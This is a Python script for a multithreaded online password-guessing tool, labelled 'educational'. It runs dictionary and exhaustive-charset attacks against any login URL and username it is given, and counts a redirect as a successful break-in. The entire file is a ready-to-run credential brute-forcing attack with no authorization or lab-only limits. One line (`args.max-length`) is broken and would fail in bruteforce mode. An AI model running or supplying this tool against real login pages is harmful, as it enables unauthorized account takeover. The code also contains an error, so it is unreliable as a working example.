import argparse
import logging
import requests
import sys
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

# --- Basic Setup ---
# Setup detailed logging to provide step-by-step insights into the script's execution.
# This is crucial for educational purposes to show the flow of a brute-force attack.
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- Core Logic ---

import itertools

def read_passwords(password_file):
    """
    Reads a list of passwords from a given file for a dictionary attack.
    """
    try:
        with open(password_file, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        logging.error(f"Password file not found: {password_file}")
        sys.exit(1)

def generate_combinations(charset, max_length):
    """
    Generates all possible combinations of a given charset up to a max_length.
    This is for a true brute-force attack.
    Warning: The number of combinations grows exponentially with max_length.
    """
    logging.info(f"Generating all combinations up to length {max_length} from charset '{charset}'...")
    for length in range(1, max_length + 1):
        # itertools.product generates the cartesian product, creating all combinations.
        for combination in itertools.product(charset, repeat=length):
            yield "".join(combination)

def attempt_login(target_url, username, password):
    """
    Attempts to log in to the target URL with a single username and password combination.
    This is the core action of the brute-force attack.
    """
    # The payload contains the data sent to the login form.
    # In a real scenario, you would inspect the login form's HTML to find
    # the correct names for the username and password fields (e.g., 'username', 'password').
    payload = {'username': username, 'password': password}
    
    try:
        # We use a session object to persist cookies across requests, which can be
        # important for correctly simulating a login flow.
        with requests.Session() as s:
            # Send the POST request with the login credentials.
            # The 'allow_redirects=False' is important because a successful login
            # often results in a redirect (e.g., to a dashboard). By capturing the
            # redirect, we can often confirm a successful login.
            response = s.post(target_url, data=payload, allow_redirects=False)

            # --- Success Condition Analysis ---
            # This is the most critical part of a brute-force script. How do we know
            # we were successful? The answer depends on the target application.
            #
            # Common indicators of success:
            # 1. A redirect to another page (e.g., status codes 301, 302, 307).
            # 2. A "welcome" message in the response body.
            # 3. The presence of a new session cookie (e.g., 'sessionid').
            #
            # Here, we check for a redirect (status code in the 300s).
            # This is a common and often reliable indicator.
            if response.status_code in [301, 302, 307]:
                logging.info(f"SUCCESS! The combination '{password}' worked for user '{username}'. The vault is open.")
                return password
            # If there's no redirect, we can check the response text for failure messages.
            # This makes the script more robust. For example, the CoffeeProject returns "Incorrect".
            elif "Incorrect" in response.text or "Invalid" in response.text:
                logging.warning(f"FAILURE. Combination: '{password}' did not work for user '{username}'")
                return None
            else:
                # If neither success nor a known failure message is found, the logic
                # might need adjustment for the specific target.
                logging.debug(f"UNKNOWN response for password '{password}'. Status: {response.status_code}, Body: {response.text[:100]}")
                return None

    except requests.exceptions.RequestException as e:
        # Handle network-related errors, such as the URL not being reachable.
        logging.error(f"Network error during request: {e}")
        return None

def main():
    """
    Main function to parse arguments and orchestrate the brute-force attack.
    """
    # --- Argument Parsing ---
    # The argparse module provides a user-friendly command-line interface.
    # This is where we define the inputs our script requires.
    parser = argparse.ArgumentParser(
        description="The Digital Safecracker: An Educational Brute-Force Simulator.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    # --- General Arguments ---
    parser.add_argument("--url", required=True, help="Target login URL.")
    parser.add_argument("--username", required=True, help="Username to attack.")
    parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads to use.")

    # --- Attack Mode Arguments ---
    parser.add_argument(
        "--mode",
        choices=['dictionary', 'bruteforce'],
        default='dictionary',
        help="Attack mode:\n"
             "  - dictionary: Use a list of passwords from a file (requires --passwords).\n"
             "  - bruteforce: Generate all possible combinations (requires --charset and --max-length)."
    )
    # --- Dictionary Mode Arguments ---
    parser.add_argument("--passwords", help="Path to the password list file (for dictionary mode).")

    # --- Brute-Force Mode Arguments ---
    parser.add_argument("--charset", default="abcdefghijklmnopqrstuvwxyz", help="Character set to use for brute-force attack.")
    parser.add_argument("--max-length", type=int, default=4, help="Maximum password length for brute-force attack. WARNING: This number grows exponentially.")

    args = parser.parse_args()

    # --- Argument Validation ---
    if args.mode == 'dictionary' and not args.passwords:
        parser.error("--passwords is required for dictionary mode.")

    # --- Pre-attack Checks ---
    logging.info(f"--- Starting Safecracking Simulation (Mode: {args.mode}) ---")
    logging.info(f"Target URL: {args.url}")
    logging.info(f"Username: {args.username}")

    # Validate the URL to ensure it's well-formed.
    if not urlparse(args.url).scheme:
        logging.error("Invalid URL. Please include a scheme (e.g., http:// or https://).")
        sys.exit(1)

    # --- Attack Execution ---
    password_iterator = None
    if args.mode == 'dictionary':
        logging.info(f"Password File: {args.passwords}")
        password_iterator = read_passwords(args.passwords)
        if not password_iterator:
            logging.error("Password list is empty or could not be read.")
            sys.exit(1)
        logging.info(f"Loaded {len(password_iterator)} possible combinations. Starting attack with {args.threads} threads...")
    elif args.mode == 'bruteforce':
        logging.info(f"Charset: {args.charset}")
        logging.info(f"Max Length: {args.max-length}")
        password_iterator = generate_combinations(args.charset, args.max_length)
        logging.info(f"Starting attack with {args.threads} threads...")

    found_password = None
    
    # --- Multi-threading for Speed ---
    # We use a ThreadPoolExecutor to manage a pool of worker threads.
    # This approach is suitable for I/O-bound tasks like sending web requests.
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        # map() is used to apply the 'attempt_login' function to each password in the iterator.
        # It processes the items from the iterator lazily, which is crucial for the
        # brute-force generator to avoid consuming all memory.
        # We pass the url and username as constant arguments to each call.
        results = executor.map(lambda p: attempt_login(args.url, args.username, p), password_iterator)

        for result in results:
            if result:
                found_password = result
                # Once a password is found, we can signal the other threads to stop.
                # This is an optimization to finish early.
                executor.shutdown(wait=False, cancel_futures=True)
                break

    # --- Reporting Results ---
    if found_password:
        logging.info(f"--- Safecracking Simulation Finished ---")
        logging.info(f"Success! The correct combination is: {found_password}")
    else:
        logging.info("--- Safecracking Simulation Finished ---")
        logging.info("The correct combination was not found in the provided list or generated combinations.")

if __name__ == "__main__":
    main()
